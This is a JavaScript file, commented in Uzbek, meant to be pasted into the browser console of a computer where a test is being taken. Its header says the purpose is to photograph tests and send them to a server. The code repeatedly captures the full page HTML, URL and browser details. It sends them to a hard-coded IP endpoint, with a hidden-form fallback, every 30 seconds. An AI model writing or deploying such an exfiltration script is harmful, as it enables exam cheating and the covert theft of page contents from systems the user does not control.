// ====================================
// Fayl nomi: inject.js
// Fayl joyi: Test berilayotgan kompyuterga
// Nima uchun: Testlarni suratga olib serverga yuborish
// Qo'llash: Brauzer konsoliga copy-paste qilish
// ====================================

(function() {
    // 1. SOZLAMALAR - O'ZGARTIRISH KERAK!
    const SERVER_URL = 'http://192.168.100.73:3000/save';  // 🔴 O'ZGARTIR: o'z IP manzilingni qo'y
    
    // 2. SAHIFANI SURATGA OLISH
    function capturePage() {
        return {
            title: document.title || 'Nomsiz sahifa',
            url: window.location.href,
            html: document.documentElement.outerHTML,
            timestamp: new Date().toISOString(),
            screen: {
                width: screen.width,
                height: screen.height
            },
            userAgent: navigator.userAgent
        };
    }
    
    // 3. SERVERGA YUBORISH
    function sendToServer(data) {
        console.log('📤 Serverga yuborilmoqda...');
        
        // Fetch bilan urinish
        fetch(SERVER_URL, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify(data)
        })
        .then(response => response.json())
        .then(result => {
            console.log('✅ Muvaffaqiyatli yuborildi:', result.message);
        })
        .catch(error => {
            console.log('❌ Xatolik:', error);
            // 2-usul: Form orqali
            backupSend(data);
        });
    }
    
    // 4. ZAXIRA YUBORISH USULI
    function backupSend(data) {
        const form = document.createElement('form');
        form.method = 'POST';
        form.action = SERVER_URL.replace('/save', '/backup');
        form.style.display = 'none';
        
        const input = document.createElement('input');
        input.type = 'hidden';
        input.name = 'data';
        input.value = JSON.stringify(data);
        form.appendChild(input);
        
        document.body.appendChild(form);
        form.submit();
        document.body.removeChild(form);
    }
    
    // 5. AVTOMATIK ISHGA TUSHISH
    function startMonitoring() {
        console.log('🎯 TEST MONITOR FAOL');
        console.log('📡 Server: ' + SERVER_URL);
        
        // Sahifa yuklanganda
        window.addEventListener('load', function() {
            console.log('🔄 Sahifa yuklandi, suratga olinmoqda...');
            setTimeout(() => {
                const data = capturePage();
                sendToServer(data);
                console.log('📸 Birinchi surat olindi');
            }, 2000); // 2 soniya kutish
        });
        
        // Har 30 soniyada yangilash
        setInterval(() => {
            const data = capturePage();
            sendToServer(data);
            console.log('🔄 Yangi surat yuborildi: ' + new Date().toLocaleTimeString());
        }, 30000);
        
        // Qo'lda yuborish uchun funktsiya
        window.captureNow = function() {
            const data = capturePage();
            sendToServer(data);
            alert('✅ Sahifa yuborildi!');
        };
    }
    
    // 6. KODNI ISHGA TUSHIRISH
    startMonitoring();
    
    // 7. BRAUZERGA BILDIRISH
    alert('🎯 TEST MONITOR FAOL!\n\nSahifa avtomatik suratga olinadi va serverga yuboriladi.');
    
    console.log(`
    =================================
    🎯 TEST MONITOR ISHGA TUSHDI
    =================================
    📍 Server: ${SERVER_URL}
    ⏱️  Vaqt: ${new Date().toLocaleTimeString()}
    📄 Sahifa: ${document.title}
    🔄 Yangilanish: 30 soniyada 1 marta
    💡 Qo'lda yuborish: captureNow() ni chaqiring
    =================================
    `);
})();
